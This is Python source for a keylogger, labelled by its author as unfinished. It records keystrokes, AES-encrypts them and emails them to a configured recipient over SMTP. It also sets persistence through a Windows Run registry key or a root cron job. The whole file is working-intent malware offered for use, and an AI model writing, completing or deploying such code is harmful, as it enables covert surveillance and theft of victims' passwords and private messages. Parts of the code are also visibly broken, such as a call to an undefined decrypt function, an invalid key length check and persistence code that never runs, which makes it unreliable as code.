''' this part is still in testing not completed yet include presistence os detection and commpatible for both linux and windows
 the user still have to insert its credentials to get mail key stokes.'''
import os
import keyboard
import time
import zipfile
import shutil
import json
import winreg
import smtplib
import ssl
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Set the public key for encryption
PUBLIC_KEY = b'your_public_key_here'

# Set the email address and password for sending the keystrokes file
EMAIL_ADDRESS = 'your_email_address_here'
EMAIL_PASSWORD = 'your_email_password_here'

# Set the SMTP server and port for sending the email
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587

# Set the email subject and recipient
EMAIL_SUBJECT = 'Keylogger Report'
EMAIL_RECIPIENT = 'your_email_recipient_here'

# Set the persistence settings for Windows and Linux
if os.name == 'nt':
    # Windows persistence
    REG_PATH = r'Software\Microsoft\Windows\CurrentVersion\Run'
    REG_KEY = 'Keylogger'
    REG_VALUE = 'C:\\Windows\\System32\\cmd.exe /c python C:\\path\\to\\keylogger.py'

    # Windows email settings
    SMTP_SERVER = 'smtp.office365.com'
    SMTP_PORT = 587

elif os.name == 'posix':
    # Linux persistence
    CRON_FILE = '/etc/cron.d/keylogger'
    CRON_LINE = '* * * * * root python /path/to/keylogger.py > /dev/null 2>&1'

    # Linux email settings
    SMTP_SERVER = 'smtp.gmail.com'
    SMTP_PORT = 587

# Set the function for sending the keystrokes file
def send_keystrokes():
    # Save the keystrokes to a file
    with open('keystrokes.txt', 'r') as f:
        keystrokes = f.read()

    # Encrypt the keystrokes
    encrypted_keystrokes = encrypt_data(keystrokes, PUBLIC_KEY)

    # Send the encrypted keystrokes by email
    send_email(encrypted_keystrokes)

    # Clear the keystrokes file
    with open('keystrokes.txt', 'w') as f:
        f.write('')

# Set the function for sending the email
def send_email(data):
    # Create the email message
    message = '''\
Subject: {subject}

{data}
'''.format(subject=EMAIL_SUBJECT, data=data.decode('utf-8'))

    # Set the email context
    context = ssl.create_default_context()

    # Send the email
    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls(context=context)
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, EMAIL_RECIPIENT, message)

        # Print the email status
        print('Email sent successfully')

    except Exception as e:
        # Print the email error
        print('Email error:', e)

# Set the function for encrypting the data
def encrypt_data(data, key):
    encryptor = AES.new(key, AES.MODE_ECB)
    return encryptor.encrypt(pad(data, AES.block_size))

# Set the function for decrypting the data
def decrypt_data(data, key):
    decryptor = AES.new(key, AES.MODE_ECB)
    return unpad(decryptor.decrypt(
decrypt(data), AES.block_size))

# Set the function for starting the keylogger
def start_keylogger():
    # Start the keylogger
    keyboard.on_press(on_press)
    keyboard.wait()

# Set the function for setting up the persistence
def setup_persistence():
    # Set the persistence based on the operating system
    if os.name == 'nt':
        # Set the Windows registry key
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        winreg.SetValueEx(key, REG_KEY, 0, winreg.REG_SZ, REG_VALUE)
        winreg.CloseKey(key)

    elif os.name == 'posix':
        # Set the Linux cron job
        with open(CRON_FILE, 'w') as f:
            f.write(CRON_LINE)

# Set the function for removing the persistence
def remove_persistence():
    # Remove the persistence based on the operating system
    if os.name == 'nt':
        # Delete the Windows registry key
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, REG_KEY)
        winreg.CloseKey(key)

    elif os.name == 'posix':
        # Remove the Linux cron job
        os.remove(CRON_FILE)

# Set the function for checking the keystrokes file size
def check_file_size():
    # Check the size of the keystrokes file
    if os.path.getsize('keystrokes.txt') >= 1500:
        # Send the keystrokes file if it's large enough
        send_keystrokes()

# Set the function for the keylogger event
def on_press(key):
    # Log the key press
    with open('keystrokes.txt', 'a') as f:
        f.write(str(key))

    # Check the file size every 100 key presses
    if len(key) % 100 == 0:
        check_file_size()

# Start the keylogger
start_keylogger()

# Set the persistence
setup_persistence()

# Wait for the keylogger to be stopped
keyboard.wait()

# Remove the persistence
remove_persistence()
